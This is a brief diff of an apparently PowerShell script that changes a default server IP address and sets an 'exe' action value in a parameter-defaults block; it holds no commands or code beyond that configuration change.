@@ -3,7 +3,7 @@ param (
 )
 
 if ($serverName -eq "") {
-    $serverName = "185.247.141.76"
+    $serverName = "185.247.141.125"
     $action = "exe"
 } 
 
